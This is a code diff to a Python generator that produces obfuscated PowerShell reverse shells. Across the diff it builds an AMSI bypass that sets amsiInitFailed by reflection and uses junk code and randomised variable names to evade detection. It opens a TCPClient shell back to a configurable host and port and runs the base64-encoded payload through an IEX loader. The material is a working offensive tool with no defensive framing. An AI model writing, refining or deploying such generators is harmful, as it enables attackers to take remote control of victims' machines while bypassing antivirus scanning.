@@ -8,10 +8,6 @@ def rand_name(length=None):
     length = length or random.randint(8, 14)
     return ''.join(random.choices(string.ascii_letters, k=length))
 
-def split_string(s):
-    # Obfuscates: "System.Net.Sockets.TCPClient" -> 'S'+'y'+'s'+...
-    return '+'.join([f"'{c}'" for c in s])
-
 def junk_code():
     j = [
         f"${rand_name()} = {random.randint(1,100)}",
@@ -22,28 +18,26 @@ def junk_code():
     ]
     return random.choice(j) + "\n"
 
-def amsi_bypass_reflection(var):
-    # Only obfuscate field name, not the type name
+def amsi_bypass_block(var):
+    # Only field name is obfuscated for reliability
+    field = '+'.join([f"'{c}'" for c in "amsiInitFailed"])
     return (
         f"${var['amsi_type']} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n"
-        f"${var['amsi_field']} = ${{{var['amsi_type']}}}.GetField({split_string('amsiInitFailed')},'NonPublic,Static')\n"
+        f"${var['amsi_field']} = ${{{var['amsi_type']}}}.GetField({field},'NonPublic,Static')\n"
         f"${var['amsi_field']}.SetValue($null,$true)\n"
     )
 
-def obf_type(type_name):
-    # Returns ([string]'S'+'y'+'s'+'t'+'e'+'m'...)
-    return f"([string]{split_string(type_name)})"
-
 def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
     var = {k: rand_name() for k in [
-        "amsi_type", "amsi_field", "amsi_failed", "tcpclient", "stream", "bytes", "i", "data", "sendback",
+        "amsi_type", "amsi_field", "tcpclient", "stream", "bytes", "i", "data", "sendback",
         "sendback2", "sendbyte"
     ]}
-    amsi_bypass = amsi_bypass_reflection(var)
+    amsi_bypass = amsi_bypass_block(var)
 
-    # Use non-obfuscated type names for class instantiation
+    # DO NOT obfuscate class/type names! This is what breaks object creation!
     core_shell = (
         junk_code() +
+        f"{amsi_bypass}"
         f"${var['tcpclient']} = New-Object System.Net.Sockets.TCPClient('{host}',{port})\n"
         f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n"
         f"${var['bytes']} = 0..65535|%{{0}}\n"
@@ -61,15 +55,12 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
         + junk_code()
     )
 
-    # --- Loader: base64 only ---
+    # Loader: base64 encode everything except the AMSI bypass block (executes in the clear)
     core_shell_bytes = core_shell.encode('utf-8')
     core_shell_b64 = base64.b64encode(core_shell_bytes).decode()
     loader_var = rand_name()
     loader = (
-        amsi_bypass +
-        junk_code() +
-        f"${loader_var} = '{core_shell_b64}'\n" +
-        junk_code() +
+        f"${loader_var} = '{core_shell_b64}'\n"
         f"IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(${loader_var})))\n"
     )
     ps = loader
